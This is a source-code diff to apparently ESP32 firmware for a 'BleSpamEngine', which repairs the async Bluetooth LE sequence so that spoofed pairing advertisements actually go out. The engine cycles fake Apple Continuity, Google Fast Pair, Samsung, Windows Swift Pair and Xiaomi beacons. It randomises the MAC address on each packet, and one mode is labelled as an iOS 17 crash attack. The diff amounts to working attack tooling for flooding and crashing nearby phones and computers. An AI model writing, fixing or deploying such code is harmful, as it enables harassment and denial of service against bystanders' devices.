@@ -11,10 +11,27 @@ BleSpamEngine& BleSpamEngine::instance() {
     return inst;
 }
 
-// ── GAP advertising-stopped callback so we can re-arm immediately ──
+// ── GAP callback: drives the set-addr -> set-data -> advertise sequence.
+// Each BLE config call is async; we must wait for its *_COMPLETE_EVT before
+// issuing the next one, otherwise data/address silently fail to apply and
+// nothing actually goes out over the air (this was the original bug).
 static void gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t* param) {
-    // No-op: we drive timing from loop(), not from BLE stack events.
-    // Kept minimal/non-blocking on purpose.
+    switch (event) {
+        case ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT:
+            BleSpamEngine::instance().onAddrSet();
+            break;
+        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
+            BleSpamEngine::instance().onAdvDataSet();
+            break;
+        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
+            BleSpamEngine::instance().onAdvStarted();
+            break;
+        case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
+            BleSpamEngine::instance().onAdvStopped();
+            break;
+        default:
+            break;
+    }
 }
 
 void BleSpamEngine::begin() {
@@ -28,10 +45,100 @@ void BleSpamEngine::begin() {
     esp_bluedroid_enable();
     esp_ble_gap_register_callback(gap_cb);
 
+
     randomizeMac();
 }
 
-// ── MAC rotation: re-randomizes the BLE static address each packet ──
+// ── Dispatch: build the payload, then kick off the async sequence ──
+void BleSpamEngine::beginAdvertiseSequence(SpamType type) {
+    std::vector<uint8_t> payload;
+    switch (type) {
+        case SpamType::APPLE_AIRPODS:
+        case SpamType::APPLE_AIRPODS_PRO:
+        case SpamType::APPLE_AIRPODS_MAX:
+        case SpamType::APPLE_AIRTAG:
+        case SpamType::APPLE_TV_SETUP:
+        case SpamType::APPLE_KEYBOARD:
+        case SpamType::APPLE_ACTION_MODAL:
+        case SpamType::APPLE_CRASH_IOS17:
+            payload = buildAppleContinuity(type);
+            break;
+        case SpamType::ANDROID_FASTPAIR:
+            payload = buildFastPair();
+            break;
+        case SpamType::SAMSUNG_BUDS:
+            payload = buildSamsungEasySetup(false);
+            break;
+        case SpamType::SAMSUNG_WATCH:
+            payload = buildSamsungEasySetup(true);
+            break;
+        case SpamType::WINDOWS_SWIFTPAIR:
+            payload = buildSwiftPair();
+            break;
+        case SpamType::XIAOMI_QUICKCONNECT:
+            payload = buildXiaomi();
+            break;
+        default:
+            return;
+    }
+
+    if (payload.size() > 31) payload.resize(31); // legacy ADV_IND payload cap
+
+    pendingPayload = payload;
+    pendingType = type;
+
+    if (rotateMac) {
+        step = Step::SETTING_ADDR;
+        randomizeMac(); // async: completion arrives in onAddrSet()
+    } else {
+        step = Step::SETTING_DATA;
+        esp_ble_gap_config_adv_data_raw(pendingPayload.data(), pendingPayload.size());
+    }
+}
+
+// onAddrSet/onAdvDataSet/onAdvStarted/onAdvStopped are invoked from the GAP
+// callback (BLE task context) — keep them fast and non-blocking.
+
+void BleSpamEngine::onAddrSet() {
+    if (step != Step::SETTING_ADDR) return;
+    step = Step::SETTING_DATA;
+    esp_ble_gap_config_adv_data_raw(pendingPayload.data(), pendingPayload.size());
+}
+
+void BleSpamEngine::onAdvDataSet() {
+    if (step != Step::SETTING_DATA) return;
+    step = Step::ADVERTISING;
+
+    esp_ble_adv_params_t advParams = {};
+    advParams.adv_int_min = 0x20;
+    advParams.adv_int_max = 0x20;
+    advParams.adv_type = ADV_TYPE_NONCONN_IND;
+    advParams.own_addr_type = rotateMac ? BLE_ADDR_TYPE_RANDOM : BLE_ADDR_TYPE_PUBLIC;
+    advParams.channel_map = ADV_CHNL_ALL;
+    advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
+
+    esp_ble_gap_start_advertising(&advParams);
+}
+
+void BleSpamEngine::onAdvStarted() {
+    if (step != Step::ADVERTISING) return;
+
+    advStartedAtMs = millis();
+
+    stats.txCount++;
+    stats.lastTxTime = millis();
+    stats.activeType = pendingType;
+
+    if (txCallback) {
+        txCallback(pendingType, stats.lastMac, pendingPayload.data(), pendingPayload.size());
+    }
+}
+
+void BleSpamEngine::onAdvStopped() {
+    step = Step::IDLE;
+}
+
+// ── MAC rotation: re-randomizes the BLE static address (async) ──
 void BleSpamEngine::randomizeMac() {
     uint8_t mac[6];
     esp_fill_random(mac, 6);
@@ -39,10 +146,80 @@ void BleSpamEngine::randomizeMac() {
 
     esp_bd_addr_t addr;
     memcpy(addr, mac, 6);
-    // ESP-IDF: set the random/static address used for the next advertisement
-    esp_ble_gap_set_rand_addr(addr);
+    esp_ble_gap_set_rand_addr(addr); // completion -> onAddrSet()
 
     memcpy(stats.lastMac, mac, 6);
+}
+
+// ── Public control ──────────────────────────────────────────────
+void BleSpamEngine::start(SpamType type) {
+    cycleQueue.clear();
+    cycleIndex = 0;
+
+    switch (type) {
+        case SpamType::ALL_APPLE:
+            cycleQueue = { SpamType::APPLE_AIRPODS, SpamType::APPLE_AIRPODS_PRO,
+                            SpamType::APPLE_AIRPODS_MAX, SpamType::APPLE_AIRTAG,
+                            SpamType::APPLE_TV_SETUP, SpamType::APPLE_KEYBOARD,
+                            SpamType::APPLE_ACTION_MODAL, SpamType::APPLE_CRASH_IOS17 };
+            break;
+        case SpamType::ALL_ANDROID:
+            cycleQueue = { SpamType::ANDROID_FASTPAIR, SpamType::SAMSUNG_BUDS,
+                            SpamType::SAMSUNG_WATCH, SpamType::XIAOMI_QUICKCONNECT };
+            break;
+        case SpamType::ALL_DEVICES:
+            cycleQueue = { SpamType::APPLE_AIRPODS, SpamType::APPLE_AIRTAG,
+                            SpamType::APPLE_TV_SETUP, SpamType::ANDROID_FASTPAIR,
+                            SpamType::SAMSUNG_BUDS, SpamType::WINDOWS_SWIFTPAIR,
+                            SpamType::XIAOMI_QUICKCONNECT };
+            break;
+        default:
+            cycleQueue = { type };
+            break;
+    }
+
+    currentType = type;
+    stats.running = true;
+    stats.txCount = 0;
+    step = Step::IDLE;
+    lastSendMs = 0; // force immediate send on next loop()
+}
+
+void BleSpamEngine::stop() {
+    stats.running = false;
+    if (step == Step::ADVERTISING) {
+        step = Step::STOPPING;
+        esp_ble_gap_stop_advertising(); // completion -> onAdvStopped()
+    } else {
+        step = Step::IDLE;
+    }
+    currentType = SpamType::NONE;
+}
+
+void BleSpamEngine::loop() {
+    if (!stats.running || cycleQueue.empty()) return;
+
+    // Each advertisement must be explicitly stopped before the next one can
+    // start (the controller only supports one active legacy adv set here).
+    if (step == Step::ADVERTISING) {
+        uint32_t now = millis();
+        if (now - advStartedAtMs >= intervalMs) {
+            step = Step::STOPPING;
+            esp_ble_gap_stop_advertising(); // -> onAdvStopped() -> step=IDLE
+        }
+        return;
+    }
+
+    if (step != Step::IDLE) return; // mid-sequence (waiting on a GAP callback)
+
+    uint32_t now = millis();
+    if (now - lastSendMs < 1) return; // tiny debounce so IDLE->next doesn't spin the same frame
+    lastSendMs = now;
+
+    SpamType toSend = cycleQueue[cycleIndex];
+    cycleIndex = (cycleIndex + 1) % cycleQueue.size();
+
+    beginAdvertiseSequence(toSend);
 }
 
 // ── Apple Continuity-style payloads (AirPods/AirTag/AppleTV/Keyboard/etc) ──
@@ -218,112 +395,3 @@ std::vector<uint8_t> BleSpamEngine::buildXiaomi() {
     return data;
 }
 
-// ── Dispatch + transmit ─────────────────────────────────────────
-void BleSpamEngine::sendAdvertisement(SpamType type) {
-    if (rotateMac) randomizeMac();
-
-    std::vector<uint8_t> payload;
-    switch (type) {
-        case SpamType::APPLE_AIRPODS:
-        case SpamType::APPLE_AIRPODS_PRO:
-        case SpamType::APPLE_AIRPODS_MAX:
-        case SpamType::APPLE_AIRTAG:
-        case SpamType::APPLE_TV_SETUP:
-        case SpamType::APPLE_KEYBOARD:
-        case SpamType::APPLE_ACTION_MODAL:
-        case SpamType::APPLE_CRASH_IOS17:
-            payload = buildAppleContinuity(type);
-            break;
-        case SpamType::ANDROID_FASTPAIR:
-            payload = buildFastPair();
-            break;
-        case SpamType::SAMSUNG_BUDS:
-            payload = buildSamsungEasySetup(false);
-            break;
-        case SpamType::SAMSUNG_WATCH:
-            payload = buildSamsungEasySetup(true);
-            break;
-        case SpamType::WINDOWS_SWIFTPAIR:
-            payload = buildSwiftPair();
-            break;
-        case SpamType::XIAOMI_QUICKCONNECT:
-            payload = buildXiaomi();
-            break;
-        default:
-            return;
-    }
-
-    if (payload.size() > 31) payload.resize(31); // legacy ADV_IND payload cap
-
-    esp_ble_gap_config_adv_data_raw(payload.data(), payload.size());
-
-    esp_ble_adv_params_t advParams = {};
-    advParams.adv_int_min = 0x20;
-    advParams.adv_int_max = 0x20;
-    advParams.adv_type = ADV_TYPE_NONCONN_IND;
-    advParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
-    advParams.channel_map = ADV_CHNL_ALL;
-    advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
-
-    esp_ble_gap_start_advertising(&advParams);
-
-    stats.txCount++;
-    stats.lastTxTime = millis();
-    stats.activeType = type;
-
-    if (txCallback) {
-        txCallback(type, stats.lastMac, payload.data(), payload.size());
-    }
-}
-
-// ── Public control ──────────────────────────────────────────────
-void BleSpamEngine::start(SpamType type) {
-    cycleQueue.clear();
-    cycleIndex = 0;
-
-    switch (type) {
-        case SpamType::ALL_APPLE:
-            cycleQueue = { SpamType::APPLE_AIRPODS, SpamType::APPLE_AIRPODS_PRO,
-                            SpamType::APPLE_AIRPODS_MAX, SpamType::APPLE_AIRTAG,
-                            SpamType::APPLE_TV_SETUP, SpamType::APPLE_KEYBOARD,
-                            SpamType::APPLE_ACTION_MODAL, SpamType::APPLE_CRASH_IOS17 };
-            break;
-        case SpamType::ALL_ANDROID:
-            cycleQueue = { SpamType::ANDROID_FASTPAIR, SpamType::SAMSUNG_BUDS,
-                            SpamType::SAMSUNG_WATCH, SpamType::XIAOMI_QUICKCONNECT };
-            break;
-        case SpamType::ALL_DEVICES:
-            cycleQueue = { SpamType::APPLE_AIRPODS, SpamType::APPLE_AIRTAG,
-                            SpamType::APPLE_TV_SETUP, SpamType::ANDROID_FASTPAIR,
-                            SpamType::SAMSUNG_BUDS, SpamType::WINDOWS_SWIFTPAIR,
-                            SpamType::XIAOMI_QUICKCONNECT };
-            break;
-        default:
-            cycleQueue = { type };
-            break;
-    }
-
-    currentType = type;
-    stats.running = true;
-    stats.txCount = 0;
-    lastSendMs = 0; // force immediate send on next loop()
-}
-
-void BleSpamEngine::stop() {
-    stats.running = false;
-    esp_ble_gap_stop_advertising();
-    currentType = SpamType::NONE;
-}
-
-void BleSpamEngine::loop() {
-    if (!stats.running || cycleQueue.empty()) return;
-
-    uint32_t now = millis();
-    if (now - lastSendMs < intervalMs) return;
-    lastSendMs = now;
-
-    SpamType toSend = cycleQueue[cycleIndex];
-    cycleIndex = (cycleIndex + 1) % cycleQueue.size();
-
-    sendAdvertisement(toSend);
-}
